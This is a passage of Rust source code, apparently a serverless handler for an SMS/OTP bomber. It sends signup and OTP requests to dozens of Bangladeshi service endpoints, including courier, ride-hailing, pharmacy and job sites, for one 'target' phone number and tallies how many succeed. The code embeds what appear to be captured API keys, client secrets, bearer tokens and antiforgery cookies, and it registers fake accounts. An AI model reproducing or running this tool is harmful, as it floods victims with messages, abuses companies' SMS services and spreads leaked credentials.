                ("Origin","https://customer.sundarbancourierltd.com"),
                ("Referer","https://customer.sundarbancourierltd.com/"),
                ("User-Agent","Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"),
                ("authorization",""),
            ]
        ),

        // 41. Porter BD
        fire("Porter BD",
            "https://customerapp-gateway-ktor.prod.porter.ae/onboarding/customer/signup",
            json!({"phone": number}),
            &[
                ("content-type","application/json"),
                ("country","bd"),
                ("preferred-languages","{\"app_language\":\"en\"}"),
                ("brand","porter"),
                ("source","android"),
                ("version-name","6.7.0"),
                ("custom-app-version-code","410"),
                ("client-request-uuid","88c7743e-d714-4735-ad05-339e43cf8e73"),
                ("installation-id","0eb9e8bc-9725-4bd5-a382-fe92c716b3c7"),
                ("app-session-id","4699341c-6f94-4481-af99-041b43d24623"),
                ("user-agent","Dalvik/2.1.0"),
                ("Origin","https://porter.in"),
            ]
        ),

        // 42. Gorilla Move
        fire("Gorilla Move",
            "https://api.gorillamove.com/api/v1/core/account/phone_login",
            json!({"phone_number": number, "step": 1}),
            &[
                ("Content-Type","application/json"),
                ("Origin","https://www.gorillamove.com"),
            ]
        ),

        // 43. Garibook — FIX: plus_bd format confirmed from raw
        fire("Garibook",
            "https://api.garibookadmin.com/api/v4/user/login",
            json!({"recaptcha_token": "garibookcaptcha", "mobile": plus_bd, "channel": "web"}),
            &[
                ("Content-Type","application/json; charset=utf-8"),
                ("Origin","https://garibook.com"),
                ("Referer","https://garibook.com/"),
                ("Accept","application/json"),
                ("X-Requested-With","mark.via.gp"),
            ]
        ),

        // ══════════════════════════════════════════
        //  SECTION 7: APPS / SERVICES
        // ══════════════════════════════════════════

        // 44. Apex4u — FIX: correct origin per raw
        fire("Apex4u",
            "https://api.apex4u.com/api/auth/login",
            json!({"phoneNumber": number}),
            &[
                ("Content-Type","application/json"),
                ("Referer","https://apex4u.com/"),
                ("Origin","https://apex4u.com"),
            ]
        ),

        // 45. Nexo Pet
        fire("Nexo Pet",
            "https://host03pet.nexopet.com/api/v1.0/users/send-otp",
            json!({"phone": number}),
            &[
                ("Content-Type","application/json"),
                ("Origin","https://www.nexopet.com"),
            ]
        ),

        // 46. AWS POC
        fire("AWS POC",
            "https://8t09wa0n0a.execute-api.ap-south-1.amazonaws.com/poc/api/v1/otp/send",
            json!({"phone": number}),
            &[("Content-Type","application/json")]
        ),

        // 47. Otithee
        fire("Otithee",
            "https://gateway.otithee.com/api/v1/generate-otp",
            json!({"request_type": "registration", "mobile_number": number}),
            &[("Content-Type","application/json")]
        ),

        // 48. Relaxy BD
        fire("Relaxy BD",
            "https://dev.api.relaxy.com.bd/api/v1/otp/send",
            json!({"phoneNumber": plus_bd, "appSignature": "appSignature"}),
            &[
                ("Content-Type","application/json"),
                ("User-Agent","Dart/2.19 (dart:io)"),
                ("x-api-key","6yjOGvakSbHjA64NGqo7m25TBC4WX8BauAXEP3dX"),
                ("Origin","https://relaxy.com.bd"),
            ]
        ),

        // 49. Bangladeshi Matrimony
        fire("BD Matrimony",
            "https://www.bangladeshimatrimony.com/register/editmobileno.php",
            json!({"mobileNo": number}),
            &[
                ("Content-Type","application/json"),
                ("Origin","https://www.bangladeshimatrimony.com"),
            ]
        ),

        // 50. MyGuardian BD
        fire("MyGuardian BD",
            "https://gliapp.myguardianbd.com/auth-gate/api/access/send-otp",
            json!({"mobileNumber": number, "type": null}),
            &[
                ("Content-Type","application/json"),
                ("Origin","https://myguardianbd.com"),
            ]
        ),

        // 51. NRB Bazaar — FIX: form-urlencoded
        fire("NRB Bazaar",
            "https://www.nrbbazaar.com/Customer/RequestOtpForRegistration",
            json!({"phoneNumber": number, "email": "example@gmail.com", "__RequestVerificationToken": "CfDJ8OTdK55f1KtKpMVto1XODz36P2tWXfyeot9aYuxWqkd81qABD_JFUva73ce2L5ftYmqCgwInZKUHisKU3mWb6DkYgBFDg4QIej8YwHP3BQ3fQvgBfc6mbMjVua7p-AT4MEPtgYhLexJmTxl7enCosqA"}),
            &[
                ("Content-Type","application/x-www-form-urlencoded"),
                ("Origin","https://www.nrbbazaar.com"),
                ("Referer","https://www.nrbbazaar.com/"),
                ("Cookie",".Nop.Antiforgery=CfDJ8N5UM1Mg0_JFs4qu7TCIBSzGu689vm8mbvSPQ743hQSg8CQN0NF_XzfjEsi78OgkEPagdV_jE0-Bv17i3ToM1axTnWqbYcicXyGSwLVIJt-Jpak2l8yoNfuDZsgWG4Hlg4xPW4OOpCtcsf5xmMkdvFk"),
            ]
        ),

        // 52. Medico Bio
        fire("Medico Bio",
            "https://api.v2.medico.bio/patient/passwordless-login",
            json!({"phoneNumber": number, "deviceId": device_id, "channel": "web", "userType": "patient", "type": "newUser"}),
            &[
                ("Content-Type","application/json"),
                ("Origin","https://medico.bio"),
            ]
        ),

        // 53. Amiprobashi — FIX: form-urlencoded + plus_bd format
        fire("Amiprobashi",
            "https://www.amiprobashi.com/api/v7/en/auth/send-otp",
            json!({"device_type": "1", "username": plus_bd, "for": "1", "type": "1", "bd_number": "1"}),
            &[
                ("content-type","application/x-www-form-urlencoded"),
                ("android-app-version","4.5.0"),
                ("user-agent","okhttp/4.10.0"),
                ("Origin","https://www.amiprobashi.com"),
            ]
        ),

        // 54. Bepari App
        fire("Bepari App",
            "https://api.bepari.app/bestfreshfarm/api/V1.4/access-control/user/registerOtp",
            json!({"client_id": 4, "client_secret": "zCzOixaOJ4JywQr1VsowGZhCaEbZ49WLxweNBgPK", "mobile_no": number}),
            &[
                ("Content-Type","application/json"),
                ("Origin","https://www.bestfreshfarm.com"),
            ]
        ),

        // 55. Hishabee
        fire("Hishabee",
            "https://distribution.hishabee.business/api/app/v1/auth/number-check",
            json!({"mobile_number": number}),
            &[
                ("Content-Type","application/json"),
                ("Origin","https://hishabee.business"),
            ]
        ),

        // 56. ILYN Global — FIX: number object format
        fire("ILYN Global",
            "https://api.ilyn.global/auth/signup",
            json!({"phone": {"code": "BD", "number": number}, "provider": "sms"}),
            &[
                ("Content-Type","application/json"),
                ("Origin","https://ilyn.global"),
            ]
        ),

        // 57. Klassy BD
        fire("Klassy BD",
            "https://api.klassy.com.bd/api/v2/public/user/register/send/otp",
            json!({"phone": number}),
            &[
                ("Content-Type","application/json"),
                ("Origin","https://klassy.com.bd"),
            ]
        ),

        // 58. One Fish
        fire("One Fish",
            "https://api.onefish.app/api/auth/user/sendotp",
            json!({"phone": number}),
            &[
                ("Content-Type","application/json"),
                ("Origin","https://onefish.app"),
            ]
        ),

        // 59. Rangs Motors — FIX: correct field name
        fire("Rangs Motors",
            "https://api.rangsmotors.com/",
            json!({"u_num": number}),
            &[
                ("Content-Type","application/json"),
                ("Origin","https://www.garimela.com"),
            ]
        ),

        // 60. Walton Amar Awaz
        fire("Walton Amar Awaz",
            "https://walton-amar-awaz-prod.com/api/user/signup",
            json!({"email": "", "fbId": "", "fullName": "User", "gId": "", "phone": number}),
            &[
                ("Content-Type","application/json"),
                ("accept","application/json"),
                ("version-code","1.4.7"),
                ("authorization","Bearer"),
                ("user-agent","okhttp/4.7.2"),
                ("Origin","https://walton-amar-awaz-prod.com"),
            ]
        ),

        // 61. PBS BD — FIX: XSRF token header
        fire("PBS BD",
            "https://pbs.com.bd/login/?handler=UserGetOtp",
            json!({"UserName": "Teamdangerous", "UserPassword": "Tushar", "MobileNo": number}),
            &[
                ("Content-Type","application/json"),
                ("XSRF-Token","CfDJ8C8FhGbSUB1CplCwhmaw48FrjIGNq5sPRk0G6VzBicZtPJrEXDCoqGMiBTb3Fetxypt-480avEXqJS_WJVdEWQeDCz0mKIQO4odODIqIopHM8qh50R7CF3bOGHOtF22Pt-pgeyMhHQTk2t2inqJMRyw"),
                ("Cookie",".AspNetCore.Antiforgery.B6RPubf2LMI=CfDJ8C8FhGbSUB1CplCwhmaw48HSKnE-hppep13XT5NAyk3laCHJb_oP0B1wPBZQP-hzP8Z2CAclzIeEqkFAMeWJS8xWzyiIMY_sMlsO7WzVcxmONd9WUDnzazvUlK9zFOY8h6Pwx1xsDD9fgtr2ltr9qHE;"),
                ("Origin","https://pbs.com.bd"),
                ("Referer","https://pbs.com.bd/login/"),
            ]
        ),

        // 62. PBS Alpha OTP — FIX: correct origin per raw request
        fire("PBS Alpha OTP",
            "https://apialpha.pbs.com.bd/api/OTP/generateOTP",
            json!({"userPhone": number, "otp": ""}),
            &[
                ("Content-Type","application/json; charset=utf-8"),
                ("Origin","https://pbs.com.bd"),
                ("Referer","https://pbs.com.bd/"),
                ("x-requested-with","XMLHttpRequest"),
            ]
        ),

        // 63. BD Tickets — FIX: plus_bd_full format
        fire("BD Tickets",
            "https://api.bdtickets.com:20100/v1/auth",
            json!({"phoneNumber": plus_bd, "createUserCheck": true, "applicationChannel": "WEB_APP"}),
            &[
                ("Content-Type","application/json; charset=utf-8"),
                ("Origin","https://bdtickets.com"),
                ("Referer","https://bdtickets.com/"),
            ]
        ),

        // 64. Shomvob — FIX: bd_full format per raw request
        fire("Shomvob",
            "https://backend-api.shomvob.co/api/v2/otp/applicant/web/phone/",
            json!({"phone": bd_full, "is_retry": 0}),
            &[
                ("Content-Type","application/json; charset=utf-8"),
                ("Authorization","Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlNob212b2JUZWNoQVBJVXNlciIsImlhdCI6MTY1OTg5NTcwOH0.IOdKen62ye0N9WljM_cj3Xffmjs3dXUqoJRZ_1ezd4Q"),
                ("Origin","https://app.shomvob.co"),
                ("Referer","https://app.shomvob.co/auth/"),
            ]
        ),

        // 65. Ghoori Learning (2nd call with different path)
        fire("Ghoori Learning 2",
            "https://api.ghoorilearning.com/api/auth/login/otp?_app_platform=web",
            json!({"mobile_no": number}),
            &[
                ("Content-Type","application/json"),
                ("Host","api.ghoorilearning.com"),
                ("Referer","https://ghoorilearning.com/"),
                ("Origin","https://ghoorilearning.com"),
            ]
        ),

        // ══════════════════════════════════════════
        //  SECTION 8: PHARMACY / HEALTH
        // ══════════════════════════════════════════

        // 66. Pharmaid RX
        fire("Pharmaid RX",
            "https://shop.pharmaid-rx.com/api/sendSMSRegistration",
            json!({"mobileNumber": number}),
            &[
                ("Content-Type","application/json"),
                ("Host","shop.pharmaid-rx.com"),
                ("Origin","https://shop.pharmaid-rx.com"),
            ]
        ),

        // 67. Osud Kini
        fire("Osud Kini",
            "https://api.osudkini.com/api/otp/generate-otp",
            json!({"phoneNo": number}),
            &[
                ("Content-Type","application/json"),
                ("Connection","keep-alive"),
                ("Origin","https://osudkini.com"),
            ]
        ),

        // ══════════════════════════════════════════
        //  SECTION 9: JOBS / MARKETPLACE
        // ══════════════════════════════════════════

        // 68. Pathao Auth — FIX: bd_no confirmed
        fire("Pathao Auth",
            "https://api.pathao.com/v2/auth/register",
            json!({"country_prefix": "880", "national_number": bd_no, "country_id": 1}),
            &[
                ("Content-Type","application/json"),
                ("app-agent","ride/android/478"),
                ("android-os","10"),
                ("user-agent","okhttp/4.12.0"),
                ("Origin","https://pathao.com"),
            ]
        ),

        // 69. Wholesale Plus
        fire("Wholesale Plus",
            "https://admin.wholesaleplus.com.bd/api/send-otp/",
            json!({"email": number, "regi": true}),
            &[
                ("Content-Type","application/json"),
                ("Origin","https://wholesaleplus.com.bd"),
            ]
        ),

        // 70. Motion View
        fire("Motion View",
            "https://api.motionview.com.bd/api/send-otp-phone-signup",
            json!({"phone": number}),
            &[
                ("Content-Type","application/json"),
                ("Origin","https://motionview.com.bd"),
            ]
        ),

        // 71. ExpressHub — FIX: form-urlencoded
        fire("ExpressHub",
            "https://expresshub.com.bd/User/CreateNewUser",
            json!({"_UID": number, "_UNAME": "TeamDangerous", "_MAIL": "td@gmail.com", "_PHONE": number, "_PASS": "Tushar2021", "_TYPE": "1"}),
            &[
                ("Content-Type","application/x-www-form-urlencoded"),
                ("Origin","https://expresshub.com.bd"),
                ("Referer","https://expresshub.com.bd/"),
            ]
        ),

        // 72. ABC Lit — FIX: recipientNo field
        fire("ABC Lit",
            "https://abclit.com/api/sendOTP",
            json!({"recipientNo": number, "code": 1234}),
            &[
                ("Content-Type","application/json"),
                ("Origin","https://abclit.com"),
            ]
        ),

        // 73. Beauty Booth
        fire("Beauty Booth",
            "https://admin.beautybooth.com.bd/api/v2/auth/register-new",
            json!({"signature": 280, "type": "phone", "value": number, "token": 39}),
            &[
                ("Content-Type","application/json; charset=utf-8"),
                ("Origin","https://beautybooth.com.bd"),
                ("Referer","https://beautybooth.com.bd/"),
                ("x-requested-with","mark.via.gp"),
            ]
        ),

        // 74. WinBaji
        fire("WinBaji",
            "https://userapi.fairbet91.com/api/RegisterUser/GenerateOTPV2",
            json!({"Mobile": number, "SiteCode": "WBJ"}),
            &[
                ("Content-Type","application/json"),
                ("Origin","https://winbaji.com"),
                ("Referer","https://winbaji.com/"),
            ]
        ),

        // ══════════════════════════════════════════
        //  BONUS: Additional working APIs
        // ══════════════════════════════════════════

        // 75. Osud Kini 2 (alt endpoint)
        fire("Easy BD Reg",
            "https://core.easy.com.bd/api/v1/registration",
            json!({"name": "Rahat", "email": "chowa@gmail.com", "mobile": number, "password": "123456", "password_confirmation": "123456", "device_key": "48b1f7061f48c950090220f62128b2c3"}),
            &[
                ("Content-Type","application/json"),
                ("Host","core.easy.com.bd"),
                ("lang","en"),
                ("device-key","48b1f7061f48c950090220f62128b2c3"),
                ("Origin","https://easy.com.bd"),
            ]
        ),

        // 76. Chorki (platform=android)
        fire("Chorki Android",
            "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=android&language=en",
            json!({"number": plus_bd_full}),
            &[
                ("Content-Type","application/json"),
                ("Origin","https://www.chorki.com"),
                ("Referer","https://www.chorki.com/"),
            ]
        ),

    ];

    let success = api_results.iter().filter(|r| r["ok"].as_bool().unwrap_or(false)).count() as u32;
    let failed  = api_results.len() as u32 - success;

    Ok(Response::ok(json!({
        "status":  "executed",
        "target":  number_str,
        "success": success,
        "failed":  failed,
        "total":   api_results.len(),
        "results": api_results,
    }).to_string())?.with_headers(headers))
}
